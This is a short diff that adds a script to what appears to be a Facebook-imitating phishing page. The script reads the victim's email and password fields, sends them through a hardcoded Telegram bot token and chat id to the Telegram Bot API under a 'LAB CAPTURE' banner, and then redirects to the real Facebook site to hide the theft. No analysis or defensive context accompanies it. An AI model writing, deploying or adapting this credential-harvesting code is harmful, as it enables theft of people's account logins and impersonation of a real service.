@@ -1,0 +1,15 @@
+<script>
+function sendData() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
+    const token = "8644361294:AAFULw8tlnBAzBCJp47CcN7GlReZiVR9fZA";
+    const chat_id = "7975512704";
+    
+    const message = `🔥 **LAB CAPTURE** 🔥\n👤 User: ${email}\n🔑 Pass: ${pass}`;
+    
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=markdown`)
+    .then(() => {
+        window.location.href = "https://www.facebook.com"; // Redirect to real FB
+    });
+}
+</script>
